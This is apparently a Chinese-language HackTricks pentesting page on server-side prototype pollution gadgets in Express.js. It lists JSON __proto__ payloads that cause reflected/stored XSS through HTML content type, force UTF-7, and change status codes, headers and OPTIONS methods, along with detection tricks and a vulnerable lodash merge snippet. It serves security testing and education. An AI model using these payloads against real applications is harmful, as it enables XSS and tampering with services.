# Express原型污染工具

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## 提供XSS响应

### 将JSON内容类型更改为HTML

在使用**JSON内容类型响应**并反射JSON的Express应用中：
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
_.merge({}, req.body);
res.send(req.body);
});
```
在这些情况下，通常无法通过JSON内容类型进行XSS攻击。然而，通过原型污染，我们可以**混淆Express以提供HTML响应**。此漏洞依赖于应用程序使用**`res.send(obj)`**并使用应用程序/json内容类型的body解析器。
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
通过污染`body`和`_body`属性，可以导致Express提供HTML内容类型并反射`_body`属性，从而导致存储型XSS。

### 渲染UTF7

可以通过以下方式使Express渲染UTF-7内容：
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## 安全扫描技巧

### JSON空格

以下的PP将使JSON中的属性多出一个空格，而不会破坏功能：
```json
{"__proto__":{"json spaces": " "}}
```
然后一个反射的JSON将会是这样的：
```json
{"foo":  "bar"} -- Note the extra space
```
### 暴露的头部信息

以下的PP gadget将会使服务器返回HTTP头部信息：**`Access-Control-Expose_headers: foo`**
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
需要安装**CORS模块**

### **OPTIONS方法**

使用以下有效载荷，可以**隐藏OPTIONS响应中的一个方法**：
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **状态**

可以使用以下PP负载更改**返回的状态码**：
```json
{"__proto__":{"status":510}}
```
### 错误

当你使用原始类型（如字符串）给原型赋值时，它会产生一个**无操作（no-op）操作，因为原型必须是一个对象**。如果你尝试将原型对象分配给`Object.prototype`本身，这将**抛出一个异常**。我们可以利用这两种行为来**检测原型污染是否成功**：
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### 反射的值

如果应用程序在响应中反映了一个对象，你可以创建一个带有**奇怪名称和`__proto__`的属性**，如果**只有奇怪的属性被反射**，那么可能存在Web漏洞：
```json
{"hacktricks":"rocks","__proto__":"test"}
```
或者如果使用了Lodash或类似的库，你可以通过PP在对象内部**设置一个属性**，如果该属性没有反映出来，那是因为Lodash会查看当前对象，以确定该属性是否已存在于合并的对象中：
```javascript
{"__proto__":{"a":"asd"},"a":"asd2","b":"dfg"}
// If only b is reflected then PP in Lodash
```
## 杂项

### 允许点号

在Express中有一个选项可以允许你从查询字符串参数中**创建对象**。\
你可以在一个漏洞**链**中利用它来利用**原型污染漏洞**。
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz` 在Node中创建一个对象。**

## 参考资料

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
